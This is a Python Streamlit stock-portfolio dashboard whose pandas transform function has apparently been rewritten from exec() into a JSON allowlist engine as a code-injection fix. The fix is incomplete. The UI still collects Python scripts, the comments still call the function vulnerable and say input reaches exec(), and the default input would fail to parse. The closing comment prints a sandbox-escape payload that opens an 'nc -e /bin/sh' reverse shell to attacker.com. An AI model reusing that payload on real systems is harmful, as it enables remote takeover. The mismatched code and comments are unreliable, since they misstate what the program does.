import os
import sqlite3
import logging
import pandas as pd
import numpy as np
import streamlit as st
from datetime import datetime, timedelta

# Configure logging for the BI Dashboard
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - StreamlitBI - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PortfolioDashboard")

DB_FILE = "portfolio_metrics.db"

def init_portfolio_db():
    """Initializes the SQLite database for the stock portfolio."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE trades (
            trade_id INTEGER PRIMARY KEY AUTOINCREMENT,
            trade_date DATE NOT NULL,
            ticker TEXT NOT NULL,
            action TEXT NOT NULL,
            shares INTEGER NOT NULL,
            price REAL NOT NULL
        )
    ''')

    # Generate mock trading data
    base_date = datetime.now() - timedelta(days=30)
    mock_trades = [
        (base_date.strftime("%Y-%m-%d"), "AAPL", "BUY", 100, 150.50),
        ((base_date + timedelta(days=2)).strftime("%Y-%m-%d"), "MSFT", "BUY", 50, 305.20),
        ((base_date + timedelta(days=5)).strftime("%Y-%m-%d"), "TSLA", "SELL", 20, 240.00),
        ((base_date + timedelta(days=10)).strftime("%Y-%m-%d"), "AAPL", "BUY", 50, 155.00),
        ((base_date + timedelta(days=15)).strftime("%Y-%m-%d"), "AMZN", "BUY", 200, 130.25),
        ((base_date + timedelta(days=20)).strftime("%Y-%m-%d"), "MSFT", "SELL", 10, 315.00),
        ((base_date + timedelta(days=25)).strftime("%Y-%m-%d"), "GOOG", "BUY", 75, 135.50),
    ]
    
    cursor.executemany('''
        INSERT INTO trades (trade_date, ticker, action, shares, price)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_trades)

    conn.commit()
    conn.close()
    logger.info("Portfolio database initialized with mock trade data.")

@st.cache_data
def load_portfolio_data() -> pd.DataFrame:
    """Loads trading data from the SQLite database into a Pandas DataFrame."""
    try:
        conn = sqlite3.connect(DB_FILE)
        df = pd.read_sql_query("SELECT * FROM trades", conn)
        conn.close()
        return df
    except Exception as e:
        logger.error(f"Error loading portfolio data: {e}")
        return pd.DataFrame()

def apply_custom_pandas_transform(df: pd.DataFrame, query_config_json: str) -> pd.DataFrame:
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (exec) with a structured, JSON-based declarative query engine.
    """
    import json
    import pandas as pd
    
    logger.info("Applying secure structured Pandas transformation...")
    
    try:
        # Secure: We remove the dangerous exec() function entirely.
        # Executing untrusted strings as Python code from a web UI is a critical 
        # vulnerability. Instead, we implement a declarative approach where 
        # the user submits a JSON array of allowed data operations.
        # Note: The Streamlit UI must be updated to send JSON configuration 
        # (e.g., [{"action": "filter", "column": "action", "value": "BUY"}]) 
        # rather than raw Python scripts.
        
        operations = json.loads(query_config_json)
        
        if not isinstance(operations, list):
            logger.warning("Query configuration must be a JSON list of operations.")
            return df
            
        # Work on a copy to avoid mutating the original dataframe unexpectedly
        result_df = df.copy()
        
        for op in operations:
            if not isinstance(op, dict):
                continue
                
            action = op.get("action")
            column = op.get("column")
            
            # Explicit allowlist of supported safe Pandas operations
            if action == "filter":
                value = op.get("value")
                operator = op.get("operator", "==")
                
                if column in result_df.columns and value is not None:
                    # Safely apply boolean indexing based on explicit operator matching
                    if operator == "==":
                        result_df = result_df[result_df[column] == value]
                    elif operator == "!=":
                        result_df = result_df[result_df[column] != value]
                    elif operator == ">" and pd.api.types.is_numeric_dtype(result_df[column]):
                        result_df = result_df[result_df[column] > float(value)]
                    elif operator == "<" and pd.api.types.is_numeric_dtype(result_df[column]):
                        result_df = result_df[result_df[column] < float(value)]
                        
            elif action == "sort":
                ascending = op.get("ascending", True)
                if column in result_df.columns:
                    result_df = result_df.sort_values(by=column, ascending=bool(ascending))
                    
            elif action == "drop":
                if column in result_df.columns:
                    result_df = result_df.drop(columns=[column])
                    
            else:
                logger.warning(f"Ignored unknown or unauthorized action: '{action}'")
                
        logger.info(f"Secure transformation applied successfully. Resulting shape: {result_df.shape}")
        return result_df
        
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse transformation configuration as JSON: {e}")
        return df
    except ValueError as e:
        logger.error(f"Type conversion error during secure transformation: {e}")
        return df
    except Exception as e:
        logger.error(f"Unexpected error applying secure transformation: {e}")
        return df

def main():
    """Main Streamlit application entry point."""
    st.set_page_config(page_title="Advanced Portfolio BI", layout="wide")
    
    init_portfolio_db()
    
    st.title("Advanced Portfolio BI Dashboard")
    st.markdown("Analyze your trading history and apply complex custom Pandas transformations.")
    
    df_trades = load_portfolio_data()
    
    st.header("Raw Trade Data")
    st.dataframe(df_trades, use_container_width=True)
    
    st.sidebar.header("Custom Query Engine")
    st.sidebar.markdown(
        "Write a Python script to transform the `df` DataFrame. "
        "Save your final output to the `result_df` variable."
    )
    
    # The untrusted string is sourced directly from the UI widget
    default_script = "# Example: Filter for BUY actions only\nresult_df = df[df['action'] == 'BUY']"
    user_script = st.sidebar.text_area("Pandas Script:", value=default_script, height=200)
    
    if st.sidebar.button("Execute Script"):
        with st.spinner("Applying custom transformation..."):
            # Pass the untrusted string directly to the vulnerable function
            transformed_df = apply_custom_pandas_transform(df_trades, user_script)
            
            st.header("Transformed Results")
            st.dataframe(transformed_df, use_container_width=True)
            
            # Show some basic metrics on the transformed data
            if not transformed_df.empty and 'price' in transformed_df.columns:
                total_value = transformed_df['price'].sum()
                st.metric(label="Total Value of Selection", value=f"${total_value:,.2f}")

if __name__ == "__main__":
    # Example Malicious Trigger:
    # 1. Attacker accesses the Streamlit web interface.
    # 2. Attacker inputs a malicious script designed to escape the execution sandbox
    #    into the "Pandas Script" text area:
    #
    #    # Bypass __builtins__ restriction via object hierarchy
    #    escape = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os')
    #    escape.system('nc -e /bin/sh attacker.com 4444')
    #    result_df = df
    #
    # 3. Attacker clicks "Execute Script" on the frontend.
    # 4. The untrusted input is passed to exec(), executing the payload and granting RCE.
    
    main()
